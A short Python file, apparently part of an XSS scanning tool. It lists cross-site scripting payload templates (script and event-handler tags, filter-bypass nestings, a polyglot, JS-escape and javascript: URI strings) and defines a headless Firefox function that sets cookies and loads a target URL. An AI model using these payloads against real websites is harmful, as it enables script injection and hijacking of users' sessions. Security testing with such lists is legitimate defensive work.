test_payloads = [
    "<script>%s</script>",
    '>"<script>%s</script>',
    "<img src=a onerror=%s>",
    '>"<img src=a onerror=%s>',
    "<svg/onload=%s>",
    # Recursive filter checks
    "<scri<script>pt>%s</scr</script>ipt>",
    "<scri<script>pt>%s</script>",
    # Polyglot
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+%s//'>",
    # JS Escape payloads
    '";%s;//',
    "';%s;//",
    "');%s;//",
    '")%s;//',
    "')%s;//",
    # DOM XSS payloads
    "\\x3cscript\\x3e%s\\x3c\\x2fscript\\x3e%s",
    "javascript:%s",
]


import logging
import asyncio
from arsenic import get_session, services, browsers


async def visit(config):
    service = services.Geckodriver()
    browser = browsers.Firefox(**{"moz:firefoxOptions": {"args": ["-headless"]}})

    async with get_session(service, browser) as session:
        await session.delete_all_cookies()
        for c in config.get("cookies", {}):
            await session.add_cookie(c, config["cookies"][c])

        await session.get(config["url"])
